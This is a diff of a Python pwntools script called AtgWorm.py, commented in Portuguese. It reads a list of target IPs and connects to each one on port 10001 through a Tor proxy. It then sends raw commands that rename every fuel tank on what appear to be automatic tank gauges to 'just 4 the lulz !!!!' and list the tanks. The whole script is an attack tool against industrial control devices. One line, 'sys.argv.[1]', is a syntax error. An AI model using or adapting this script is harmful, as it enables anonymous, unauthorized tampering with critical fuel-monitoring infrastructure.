@@ -10,19 +10,9 @@ from pwn import *
 from time import sleep
 import sys
 
-banner = """
-
-\t\t\t\t\t\t  __ _| |_ __ ___      _____  _ __ _ __ ___  
-\t\t\t\t\t\t / _` | __/ _` \ \ /\ / / _ \| '__| '_ ` _ \ 
-\t\t\t\t\t\t| (_| | || (_| |\ V  V / (_) | |  | | | | | |
-\t\t\t\t\t\t \__,_|\__\__, | \_/\_/ \___/|_|  |_| |_| |_|
-\t\t\t\t\t\t          |___/                              
-"""
-print(banner)
-
 # help option
 if sys.argv[1] == "-h":
-	print "\t\t\t\t\t\tModo de uso:\n\t\t\t\t\t\tVoce deve passar como parametro um arquivo .txt contendo os ip's que o script ira usar, exemplo:\n\t\t\t\t\t\t$ python AtgWorm.py -f alvos.txt\n\n"
+	print "Modo de uso:\nVoce deve passar como parametro um arquivo .txt contendo os ip's que o script ira usar, exemplo: $ python AtgWorm.py -f alvos.txt\n\n"
 	exit()
 elif sys.argv.[1] == "-f":
 	arquivo = open(sys.argv[2])
@@ -30,7 +20,8 @@ elif sys.argv.[1] == "-f":
 	
 # usa proxy do tor durante as conexoes
 context.proxy = (socks.SOCKS5, 'localhost', 9050)
-# pega seu IP
+
+# Verificando se o funcionamento do proxy esta OK
 wg = wget('https://ipinfo.io/ip')
 
 if wg is None:
@@ -43,8 +34,7 @@ sleep(4)
 for ip in ips:
 	try:
 		r = remote(ip, 10001)
-		# comando para mudar o nome de todos os tanques para "just 4 the lulz !!!!"
-		r.send('\x01'+'S60200 just 4 the lulz !!!!\r\n') 
+		r.send('\x01'+'S60200 just 4 the lulz !!!!\r\n') # comando para mudar o nome de todos os tanques para "just 4 the lulz !!!!"
 		r.send('\x01'+'I20100\r\n') # lista todos os tanques
 		
 		r.recvuntil(' ', drop=True)	
@@ -52,7 +42,6 @@ for ip in ips:
 		print "\tresponse = {}".format(response)
 		
 		r.close()
-	except:
-		# caso nao consiga se conectar no ip vai para o proximo da lista
-		print "erro ao conectar ao ip {}:10001".format(ip)
+	except:	# caso nao consiga se conectar no ip vai para o proximo da lista
+		print "erro ao conectar ao host {}:10001".format(ip)
 		pass
